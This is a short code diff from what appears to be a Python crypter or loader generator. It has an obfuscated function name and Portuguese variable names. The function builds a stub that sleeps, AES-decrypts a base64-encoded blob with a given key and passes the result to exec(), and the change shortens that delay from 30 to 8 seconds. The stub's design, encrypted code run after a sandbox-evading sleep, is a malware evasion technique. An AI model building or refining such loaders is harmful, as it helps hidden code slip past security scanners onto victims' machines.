@@ -33,7 +33,7 @@ def beirfwihfsajps(path, output, chave):
 	payload = "from Crypto.Cipher import AES\n"
 	payload += "from base64 import b64decode\n"
 	payload += "from time import sleep\n"
-	payload += "sleep(30)\n"
+	payload += "sleep(8)\n"
 	payload += "aes = AES.new('%s', AES.MODE_ECB)\n" % chave
 	payload += "exec(aes.decrypt(b64decode('%s')).rstrip('%s'))" % (abdasbdio_cifrado, PAD)
 
